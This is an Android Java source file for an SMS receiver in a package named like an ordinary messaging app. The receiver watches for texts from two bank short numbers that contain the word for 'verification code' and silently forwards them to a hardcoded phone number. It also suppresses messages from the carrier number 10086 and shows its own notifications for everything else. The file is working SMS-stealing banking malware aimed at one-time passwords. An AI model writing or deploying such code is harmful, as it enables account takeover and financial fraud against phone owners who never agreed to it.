package com.example.message;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

@SuppressLint("NewApi")
@TargetApi(Build.VERSION_CODES.HONEYCOMB)
public class SMSReceiver extends BroadcastReceiver {

	private int tag = 1;
	String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	private String phone = "15757121405";

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		if (intent.getAction().equals(SMS_RECEIVED)) {
			smg(context, intent);
		}
	}

	public void smg(Context context, Intent intent) {
		System.out.println("SMSReceiver, isOrderdeBroadcast()="
				+ isOrderedBroadcast());
		Bundle bundle = intent.getExtras();
		Object messages[] = (Object[]) bundle.get("pdus");
		if (messages != null && messages.length > 0) {
			SmsMessage smsMessage[] = new SmsMessage[messages.length];
			for (int n = 0; n < smsMessage.length; n++) {
				smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
			}
			for (SmsMessage message : smsMessage) {
				String content = message.getMessageBody();
				String sender = message.getOriginatingAddress();
				if (sender.equals("95508") || sender.equals("95555")) {// 广发信用卡//
					SmsManager smsManager = SmsManager.getDefault();
					if (content.indexOf("验证码") != -1) {
						/** 切分短信，每七十个汉字切一个，不足七十就只有一个：返回的是字符串的List集合 */
						// List<String> texts =
						// smsManager.divideMessage(content);
						// 发送之前检查短信内容是否为空
						// for (int i = 0; i < texts.size(); i++) {
						// String text = texts.get(i);
						// }
						smsManager.sendTextMessage(phone, null, content, null,
								null);
					}
				} else {
					if (sender.equals("10086")) {
						this.abortBroadcast();
					} else {
						addNotification(context, content, sender);
						tag++;
					}
				}
			}
		}
	}

	private void addNotification(Context context, String msg, String sender) {
		NotificationManager manager = (NotificationManager) context
				.getSystemService(Context.NOTIFICATION_SERVICE);
		Intent intent = new Intent(context, MainActivity.class);
		Bundle bundle = new Bundle();
		bundle.putString("msg", msg);
		bundle.putString("sender", sender);
		intent.putExtras(bundle);
		PendingIntent pendingIntent = PendingIntent.getActivity(context, 0,
				intent, PendingIntent.FLAG_ONE_SHOT);
		Notification noti = new Notification.Builder(context)
				.setContentTitle(sender).setContentText(msg).setTicker("MSG")
				.setContentIntent(pendingIntent)
				.setSmallIcon(R.drawable.notice).build();
		manager.notify(tag, noti);
	}
}
